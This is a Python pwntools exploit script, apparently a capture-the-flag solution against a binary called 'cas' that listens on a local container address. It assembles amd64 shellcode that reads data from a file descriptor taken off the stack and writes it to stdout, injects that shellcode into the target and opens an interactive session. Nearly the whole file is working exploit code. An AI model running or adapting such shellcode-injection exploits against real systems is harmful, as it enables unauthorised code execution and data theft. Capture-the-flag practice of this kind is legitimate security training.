#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './cas'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote("172.17.0.2",2323)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
set follow-fork-mode child
entry-break
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()
p.recvline()
p.recvline()


#sc = shellcraft.amd64.linux.echo('abc') 
sc = """
mov ebx, [rsp + 0xc]\r\n
sub rsp, 0x40\r\n
"""
sc += shellcraft.amd64.linux.read('ebx', 'rsp', 0x40)
sc += shellcraft.amd64.linux.write(1, 'rsp', 0x40)
size = len(asm(sc))

p.sendline('{}'.format(size + 0x10))
p.recvline()
p.sendline(asm(sc))
p.interactive()
